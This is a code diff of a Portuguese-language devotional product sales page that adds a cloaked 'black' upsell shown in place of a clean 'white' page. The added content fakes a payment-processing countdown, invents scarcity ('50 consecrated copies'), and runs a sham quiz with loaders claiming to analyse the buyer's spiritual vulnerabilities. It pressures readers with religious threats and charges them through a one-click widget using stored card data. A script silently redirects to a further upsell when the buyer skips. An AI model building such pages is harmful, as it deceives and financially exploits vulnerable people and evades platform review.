-<!-- ===================== WHITE: pagina do produto ===================== -->
+<!-- =============== CONTEÚDO REAL (BLACK - UPSELL 1) =============== -->
+<div id="conteudo-real" data-fase="proc">
+
+  <!-- BARRA VERMELHA (fica sempre) -->
+  <div class="topo-vermelho" id="topo-vermelho">⚠️ Importante: não carregue em voltar nem atualize esta página — pode interromper o processamento da sua contribuição. <b>Aguarde a confirmação.</b></div>
+
+  <!-- PROCESSAMENTO COM CONTAGEM (6 s) -> CONFIRMADO -->
+  <div class="proc-pag" id="proc-pag">
+    <div class="proc-anel" id="proc-anel"><span id="proc-seg">6</span></div>
+    <p class="proc-txt" id="proc-txt">A confirmar a sua contribuição…</p>
+    <p class="proc-sub" id="proc-sub">Falta <b id="proc-falta">6</b> segundos</p>
+    <p class="proc-nao-feche" id="proc-nao-feche">Não feche esta página enquanto isso.</p>
+  </div>
+
+  <!-- PARABÉNS -->
+  <div class="congrats" id="faixa-congrats">🎉 Parabéns! A sua contribuição foi acolhida.</div>
+
+  <!-- BLOCO LIMPO E DIRETO -->
+  <section class="escolhida" id="bloco-escolhida">
+    <div class="wrap">
+      <h2 class="esc-titulo">FOI AGRACIADA</h2>
+      <p class="esc-sub">Para receber o <strong>Acelerador do Desatador de Nós</strong> — o Guia 15 Dias com Maria que faz os seus nós soltarem-se <strong>em até 3 dias</strong>, e não em 9!</p>
+      <p class="esc-txt">Ignorar isto agora seria como recusar uma bênção enviada diretamente por Deus — e quando esta porta se fechar, <mark>não voltará a abrir-se</mark>.</p>
+      <p class="esc-txt">Toque em <strong class="esc-verde">"SIM, QUERO A MINHA GRAÇA"</strong> e receba o que o Céu reservou apenas para os escolhidos.</p>
+
+      <img class="esc-img" src="guia-15-dias-maria.jpg" alt="Guia Espiritual 15 Dias com Maria" width="800" height="1067" decoding="async">
+
+      <!-- AVISO DISCRETO DE 50 CÓPIAS CONSAGRADAS -->
+      <div style="max-width:440px;margin:14px auto 18px;text-align:center;padding:10px 14px;background:rgba(255,255,255,0.75);border:1px solid #e2d9c2;border-radius:10px;box-shadow:0 2px 8px rgba(0,0,0,0.03);">
+        <p style="font-size:12.5px;font-weight:600;color:#5c5446;margin:0;line-height:1.45;">
+          🕊️ <strong style="color:#222;">Edição limitada:</strong> Apenas 50 cópias consagradas sobre o altar. Toque numa das opções abaixo para vincular a sua:
+        </p>
+      </div>
+
+            <!-- QUIZ INTERATIVO COM LOADERS -->
+      <div id="quiz-blindagem" style="max-width:460px;margin:0 auto 24px;">
+        
+        <!-- ETAPA 1 -->
+        <div id="quiz-etapa-1" class="quiz-step">
+          <div style="font-size:11.5px;font-weight:800;letter-spacing:1px;color:#0b6b2e;text-transform:uppercase;margin-bottom:6px;text-align:center;">Pergunta 1 de 3</div>
+          <h3 style="font-size:16px;font-weight:800;line-height:1.35;color:#111;text-align:center;margin-bottom:8px;">Assim que os seus nós forem desatados, onde você mais teme que as forças contrárias tentem te atacar?</h3>
+          <p class="quiz-instruction">👇 Toque em uma das opções abaixo para escolher:</p>
+          <div style="display:flex;flex-direction:column;gap:10px;">
+            <button type="button" class="quiz-btn" onclick="responderPergunta(1, this)">
+              <span class="quiz-ic">👁️</span>
+              <span class="quiz-txt">Na inveja de pessoas próximas ou parentes que não gostam de me ver vencer</span>
+              <span class="quiz-radio"></span>
+            </button>
+            <button type="button" class="quiz-btn" onclick="responderPergunta(1, this)">
+              <span class="quiz-ic">🏠</span>
+              <span class="quiz-txt">Nas brigas repentinas e discórdias dentro da minha própria casa</span>
+              <span class="quiz-radio"></span>
+            </button>
+            <button type="button" class="quiz-btn" onclick="responderPergunta(1, this)">
+              <span class="quiz-ic">💸</span>
+              <span class="quiz-txt">Em gastos inesperados que sempre travam meu dinheiro no fim do mês</span>
+              <span class="quiz-radio"></span>
+            </button>
+          </div>
+        </div>
+
+        <!-- LOADER 1 -->
+        <div id="quiz-loader-1" class="quiz-loader" style="display:none;">
+          <div class="proc-anel" style="width:48px;height:48px;border-width:4px;margin:10px auto 14px;"></div>
+          <p style="font-size:14.5px;font-weight:800;color:#111;">A analisar as vulnerabilidades do seu lar…</p>
+          <p style="font-size:12.5px;color:#666;margin-top:4px;">A calcular a blindagem espiritual necessária</p>
+          <div style="background:#e5e7eb;border-radius:999px;height:6px;width:100%;max-width:240px;margin:14px auto 0;overflow:hidden;">
+            <div style="background:#057932;height:100%;width:33%;transition:width .4s;"></div>
+          </div>
+        </div>
+
+        <!-- ETAPA 2 -->
+        <div id="quiz-etapa-2" class="quiz-step" style="display:none;">
+          <div style="font-size:11.5px;font-weight:800;letter-spacing:1px;color:#0b6b2e;text-transform:uppercase;margin-bottom:6px;text-align:center;">Pergunta 2 de 3</div>
+          <h3 style="font-size:16px;font-weight:800;line-height:1.35;color:#111;text-align:center;margin-bottom:8px;">Sob o Manto Protetor de Maria, quem você mais deseja cobrir durante esses 15 dias de oração?</h3>
+          <p class="quiz-instruction">👇 Toque na opção que deseja proteger:</p>
+          <div style="display:flex;flex-direction:column;gap:10px;">
+            <button type="button" class="quiz-btn" onclick="responderPergunta(2, this)">
+              <span class="quiz-ic">👨‍👩‍👧‍👦</span>
+              <span class="quiz-txt">Os meus filhos e netos (para que nenhum mal espiritual os alcance)</span>
+              <span class="quiz-radio"></span>
+            </button>
+            <button type="button" class="quiz-btn" onclick="responderPergunta(2, this)">
+              <span class="quiz-ic">💍</span>
+              <span class="quiz-txt">O meu casamento e a paz do meu lar</span>
+              <span class="quiz-radio"></span>
+            </button>
+            <button type="button" class="quiz-btn" onclick="responderPergunta(2, this)">
+              <span class="quiz-ic">🛡️</span>
+              <span class="quiz-txt">A minha própria mente e a proteção da minha vida inteira</span>
+              <span class="quiz-radio"></span>
+            </button>
+          </div>
+        </div>
+
+        <!-- LOADER 2 -->
+        <div id="quiz-loader-2" class="quiz-loader" style="display:none;">
+          <div class="proc-anel" style="width:48px;height:48px;border-width:4px;margin:10px auto 14px;"></div>
+          <p style="font-size:14.5px;font-weight:800;color:#111;">A inscrever os nomes dos seus entes queridos…</p>
+          <p style="font-size:12.5px;color:#666;margin-top:4px;">A vincular a intenção ao Roteiro dos 15 Dias</p>
+          <div style="background:#e5e7eb;border-radius:999px;height:6px;width:100%;max-width:240px;margin:14px auto 0;overflow:hidden;">
+            <div style="background:#057932;height:100%;width:66%;transition:width .4s;"></div>
+          </div>
+        </div>
+
+        <!-- ETAPA 3 -->
+        <div id="quiz-etapa-3" class="quiz-step" style="display:none;">
+          <div style="font-size:11.5px;font-weight:800;letter-spacing:1px;color:#0b6b2e;text-transform:uppercase;margin-bottom:6px;text-align:center;">Pergunta 3 de 3</div>
+          <h3 style="font-size:16px;font-weight:800;line-height:1.35;color:#111;text-align:center;margin-bottom:8px;">As orações de blindagem exigem apenas 3 minutos antes de dormir. Você se compromete a fazer a leitura?</h3>
+          <p class="quiz-instruction">👇 Toque para confirmar o seu compromisso:</p>
+          <div style="display:flex;flex-direction:column;gap:10px;">
+            <button type="button" class="quiz-btn" onclick="responderPergunta(3, this)">
+              <span class="quiz-ic">🕯️</span>
+              <span class="quiz-txt">SIM, comprometo-me a dedicar 3 minutos para blindar a minha família</span>
+              <span class="quiz-radio"></span>
+            </button>
+            <button type="button" class="quiz-btn" onclick="responderPergunta(3, this)">
+              <span class="quiz-ic">✨</span>
+              <span class="quiz-txt">SIM, não quero permitir que nenhum novo nó volte a amarrar a minha vida</span>
+              <span class="quiz-radio"></span>
+            </button>
+          </div>
+        </div>
+
+        <!-- LOADER FINAL -->
+        <div id="quiz-loader-final" class="quiz-loader" style="display:none;">
+          <div class="proc-anel" style="width:48px;height:48px;border-width:4px;margin:10px auto 14px;"></div>
+          <p style="font-size:14.5px;font-weight:800;color:#111;">A reservar 1 das 50 cópias consagradas em seu nome…</p>
+          <p style="font-size:12.5px;color:#666;margin-top:4px;">A fechar a lista e gerar a sua bênção imediata</p>
+          <div style="background:#e5e7eb;border-radius:999px;height:6px;width:100%;max-width:240px;margin:14px auto 0;overflow:hidden;">
+            <div id="quiz-bar-final" style="background:#057932;height:100%;width:90%;transition:width .6s;"></div>
+          </div>
+        </div>
+
+        <!-- RESULTADO FINAL COM O BOTÃO DE UPSELL ORIGINAL (1-CLICK KASHPAY) -->
+        <div id="quiz-resultado" style="display:none;animation:fadeIn .5s ease;">
+          <div style="background:#ffffff;border:2.5px solid #057932;border-radius:16px;padding:20px 16px 16px;box-shadow:0 10px 28px rgba(5,121,50,0.18);text-align:center;">
+            <div style="background:#e7f6ec;color:#0b6b2e;font-size:11.5px;font-weight:800;letter-spacing:1px;text-transform:uppercase;padding:5px 12px;border-radius:999px;display:inline-block;margin-bottom:8px;">
+              ✓ CÓPIA RESERVADA COM SUCESSO
+            </div>
+            <h3 style="font-size:18px;font-weight:900;color:#111;margin-bottom:4px;text-transform:uppercase;">
+              A Sua Blindagem dos 15 Dias Foi Liberada
+            </h3>
+            <p style="font-size:13.5px;color:#444;font-weight:600;line-height:1.45;margin-bottom:14px;">
+              Uma das 50 cópias consagradas foi vinculada à sua intenção. Toque abaixo para confirmar a sua bênção:
+            </p>
+
+            <!-- WIDGET ONE-CLICK HOTMART (recortado: so o botao) -->
+            <div class="hm-fora"><div class="hm-escala"><div class="hm-janela">
+              <div id="widget-black" class="hotmart-widget-container"></div>
+            </div></div></div>
+            <p class="hm-nota">Um toque e pronto — o pagamento usa os dados que já confirmou.</p>
+          </div>
+        </div>
+
+      </div>
+    </div>
+  </section>
+
+  <!-- PROCESSAMENTO: contagem de 6 s, confirma, chuva dourada e revela o bloco -->
+  <script src="https://cdn.jsdelivr.net/npm/canvas-confetti@1.9.3/dist/confetti.browser.min.js" async></script>
+  <script>
+  (function(){
+    var raiz = document.getElementById('conteudo-real');
+    if (!raiz) return;
+    var seg = 6;
+    var elSeg = document.getElementById('proc-seg'), elFalta = document.getElementById('proc-falta');
+    var t = setInterval(function(){
+      seg--;
+      if (seg > 0) { if (elSeg) elSeg.textContent = seg; if (elFalta) elFalta.textContent = seg; return; }
+      clearInterval(t);
+      var anel = document.getElementById('proc-anel'), txt = document.getElementById('proc-txt'),
+          sub = document.getElementById('proc-sub'), nf = document.getElementById('proc-nao-feche');
+      if (elSeg) elSeg.textContent = '';
+      if (anel) anel.classList.add('ok');
+      if (txt) { txt.textContent = 'Contribuição confirmada'; txt.classList.add('ok'); }
+      if (sub) sub.textContent = 'O seu nome foi colocado diante do altar.';
+      if (nf) nf.style.display = 'none';
+      raiz.setAttribute('data-fase', 'ok');
+      var topo = document.getElementById('topo-vermelho');
+      if (topo) topo.innerHTML = '✅ Contribuição confirmada. <b>Continue a descer para aceder à sua bênção 👇</b>';
+      try { if (window.confetti) confetti({ particleCount: 140, spread: 80, origin: { y: 0.35 }, colors: ['#D4AF37','#FDF3D6','#0f8a3c','#ffffff'] }); } catch(e){}
+    }, 1000);
+  })();
+  </script>
+
+</div>
+
+<!-- =============== PÁGINA INSTITUCIONAL CLEAN (WHITE) =============== -->
 <div id="pagina-clean">
   <div class="wrap">
     <div class="w-top">Caminhos da Fé · Material devocional</div>
@@ -158,55 +742,127 @@ html[data-gate="real"] #pagina-clean{display:none !important;}
   </div>
 </div>
 
-<!-- ===================== BLACK: oferta dentro do funil ===================== -->
-<div id="conteudo-real">
-  <div class="b-topo">✅ Pagamento confirmado — falta apenas um passo</div>
-  <div class="wrap">
-    <div class="b-etapa">Etapa 1 de 3 · A sua Novena está confirmada</div>
-    <h1 class="b-h1">A SUA BÊNÇÃO FOI LIBERTADA EM SEU NOME</h1>
-    <p class="b-lead">Antes de entrar no Santuário, há uma coisa que preciso de lhe dizer — e é a mais importante de todas.</p>
-    <img src="../images/guia-15-dias-maria.jpg" alt="" class="b-img">
 
-    <div class="b-corpo">
-      <p>A Novena das 9 Palavras dura nove dias. É assim que foi rezada durante quatrocentos anos, e é assim que funciona.</p>
-      <p>Mas existe um caminho mais curto. Não mais fácil — mais <b>intenso</b>.</p>
-      <p>O <b>Guia de Proteção Espiritual — 15 Dias com Maria</b> é o que os monges de Augsburgo faziam quando o nó era urgente demais para esperar nove dias: rezavam com mais frequência, com mais disciplina, e mantinham a chama acesa muito depois da novena terminar.</p>
-      <p>São quinze dias de orações, leituras e intenções — uma para cada manhã. A senhora usa no ritmo que precisar: seguido, para atravessar uma aflição de agora; ou espalhado, para não deixar a graça esmorecer depois do nono dia.</p>
-    </div>
+    <script>
+  window.responderPergunta = function(etapa, btn) {
+    if (btn) {
+      btn.classList.add('selected');
+    }
+    setTimeout(function() {
+      if (etapa === 1) {
+        document.getElementById('quiz-etapa-1').style.display = 'none';
+        document.getElementById('quiz-loader-1').style.display = 'block';
+        setTimeout(function() {
+          document.getElementById('quiz-loader-1').style.display = 'none';
+          document.getElementById('quiz-etapa-2').style.display = 'block';
+        }, 3800);
+      } else if (etapa === 2) {
+        document.getElementById('quiz-etapa-2').style.display = 'none';
+        document.getElementById('quiz-loader-2').style.display = 'block';
+        setTimeout(function() {
+          document.getElementById('quiz-loader-2').style.display = 'none';
+          document.getElementById('quiz-etapa-3').style.display = 'block';
+        }, 3800);
+      } else if (etapa === 3) {
+        document.getElementById('quiz-etapa-3').style.display = 'none';
+        document.getElementById('quiz-loader-final').style.display = 'block';
+        setTimeout(function() {
+          var bar = document.getElementById('quiz-bar-final');
+          if (bar) bar.style.width = '100%';
+        }, 2000);
+        setTimeout(function() {
+          document.getElementById('quiz-loader-final').style.display = 'none';
+          document.getElementById('quiz-resultado').style.display = 'block';
+          try {
+            if (window.confetti) {
+              confetti({ particleCount: 90, spread: 70, origin: { y: 0.6 }, colors: ['#057932', '#D4AF37', '#ffffff'] });
+            }
+          } catch(e){}
+        }, 4200);
+      }
+    }, 200);
+  };
+  </script>
 
-    <div class="b-aviso">⚠️ Este material só é oferecido aqui, nesta página, uma única vez. Não volta a aparecer no Santuário nem no seu e-mail.</div>
 
-    <div id="caixa-widget">
-      <div id="widget-black" class="hotmart-widget-container"></div>
-      <div id="cover-box-top"></div>
-      <div id="cover-box-bottom"></div>
-    </div>
+  <!-- REDIRECIONAMENTO SILENCIOSO EM CASO DE RECUSA/FALHA NO CARTÃO (U1 -> /u2/) -->
+  <script>
+  (function() {
+    var redirected = false;
+    var targetPath = '/u2/';
 
-  </div>
-</div>
+    function triggerRedirect() {
+      if (redirected) return;
+      redirected = true;
+      var search = window.location.search || '';
+      if (!search) {
+        search = '?src=fs2026';
+      } else if (search.indexOf('src=') === -1) {
+        search += '&src=fs2026';
+      }
+      window.location.href = targetPath + search;
+    }
+
+    // Se já estiver no DOM
+    if (document.getElementById('kashpay-skip-btn')) {
+      triggerRedirect();
+      return;
+    }
+
+    // MutationObserver em document.body para detectar quando #kashpay-skip-btn for renderizado
+    var observer = new MutationObserver(function(mutations, obs) {
+      if (redirected) return;
+      var skipBtn = document.getElementById('kashpay-skip-btn') || document.querySelector('#kashpay-skip-btn');
+      if (skipBtn) {
+        obs.disconnect();
+        triggerRedirect();
+      }
+    });
+
+    function initObserver() {
+      if (document.body) {
+        observer.observe(document.body, { childList: true, subtree: true });
+      } else {
+        document.addEventListener('DOMContentLoaded', function() {
+          if (document.body) {
+            observer.observe(document.body, { childList: true, subtree: true });
+          }
+        });
+      }
+    }
+
+    initObserver();
+  })();
+  </script>
 
 <script>
-/* So pode existir UM id="hotmart-sales-funnel" na pagina: move para o container visivel
-   (white ou black) e so entao monta o widget. */
+/* ---------- monta o widget no container VISIVEL (so pode existir um id) ----------
+   Espera o container aparecer: na black ele so e revelado depois da contagem. */
 (function(){
   var montado = false;
-  function montar(){
+  function escalar(){
+    var fora = document.querySelector('.hm-fora');
+    if (!fora) return;
+    var esc = fora.querySelector('.hm-escala');
+    var s = Math.min(1, fora.clientWidth / 420);
+    esc.style.transform = 'scale(' + s + ')';
+    fora.style.height = Math.ceil(92 * s) + 'px';
+  }
+  function visivel(el){ return !!(el && el.offsetParent !== null); }
+  function tentar(){
+    escalar();
     if (montado) return;
     var real = document.documentElement.getAttribute('data-gate') === 'real';
-    var alvo = document.getElementById('hotmart-sales-funnel')
-            || document.getElementById(real ? 'widget-black' : 'widget-white');
-    if (!alvo) return;
+    var alvo = document.getElementById(real ? 'widget-black' : 'widget-white');
+    if (!alvo || !visivel(alvo) || !window.checkoutElements) return;
     alvo.setAttribute('id','hotmart-sales-funnel');
-    if (!window.checkoutElements) { setTimeout(montar, 400); return; }
-    try {
-      checkoutElements.init('salesFunnel').mount('#hotmart-sales-funnel');
-      montado = true;
-    } catch(e){
-      setTimeout(montar, 600);
-    }
+    try { checkoutElements.init('salesFunnel').mount('#hotmart-sales-funnel'); montado = true; setTimeout(escalar, 800); }
+    catch(e){ alvo.setAttribute('id', real ? 'widget-black' : 'widget-white'); }
   }
-  if (document.readyState === 'loading') document.addEventListener('DOMContentLoaded', montar);
-  else montar();
+  var relogio = setInterval(function(){ tentar(); if (montado) { clearInterval(relogio); setInterval(escalar, 1200); } }, 300);
+  window.addEventListener('resize', escalar);
+  if (document.readyState !== 'loading') tentar();
+  else document.addEventListener('DOMContentLoaded', tentar);
 })();
 </script>
 </body>
